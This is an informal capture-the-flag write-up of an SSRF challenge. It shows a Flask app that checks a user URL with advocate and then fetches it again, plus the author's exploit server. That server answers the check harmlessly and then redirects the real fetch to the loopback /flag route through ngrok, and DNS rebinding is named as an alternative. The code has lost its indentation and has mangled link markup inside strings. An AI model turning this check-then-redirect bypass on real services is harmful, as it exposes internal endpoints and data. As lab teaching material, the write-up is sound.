so this was the ssrf bypassing challenge where the python based website server was running the code was quite simple whereas the solution was kinda great

the website was that it was taking the url from user and directing to the dest. by checking it safe or not

the code was:

####

from flask import Flask, request, render_template

import os

import advocate

import requests

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])

def index():

if request.method == 'POST':

url = request.form['url']

# Prevent SSRF

try:

advocate.get(url)

except:

return render_template('index.html', error=f"The URL you entered is dangerous and not allowed.")

r = requests.get(url)

return render_template('index.html', result=r.text)

return render_template('index.html')

@app.route('/flag')

def flag():

if request.remote_addr == '127.0.0.1':

return render_template('flag.html', FLAG=os.environ.get("FLAG"))

else:

return render_template('forbidden.html'), 403

if __name__ == '__main__':

app.run(host="0.0.0.0", port=80, threaded=True)

#####

as we can see that when the website was having the url just “/” at last eg: [https://youtube.com/](https://youtube.com/)

it was executing the code @app.route('/')

else the code below if “/flag”

but when we gave such thing it blocked it

also look at the code , we get the flag only when the remote address was 127.0.0.1 i.e loopback address of machine

the tricky part of the above code was that it was checking the website itself first before redirecting it to the user

so we somehow had to give 2 website 1 good one to fool it and then other one that is ours to run back of the server

so what we had to do was to either try a dns rebinding attack

refer: [https://hong5489.github.io/2022-06-06-seetf2022/#ssrf](https://hong5489.github.io/2022-06-06-seetf2022/#ssrf)

or the 2nd method to port forward it to our server where we run our malicious code and that code contained the the url for it's loopback address:

so we made our code :

####

from flask import Flask , redirect, request

app = Flask(__name__)

check=True;

@app.route("/")

def index():

return "<a href='[https://youtube.com'>youtube</a>";](https://youtube.com'>youtube</a>)

@app.route("/exploit",methods=['GET','POST'])

def handle():

global check

if check:

check=False; # sahi req

return "beta pehli sahi thi lekin duusri?"

else:

check=True; # malicious req

return redirect("[http://127.0.0.1/flag",](http://127.0.0.1/flag) code=302)

####

we then used flask-run to start the server and run it whosoever requests it

see how we gave the good yt link and then we gave the second link

then we started the ngrok service for the 5000 server :

so we put the url in the website like this:

<url of ngrok>/exploit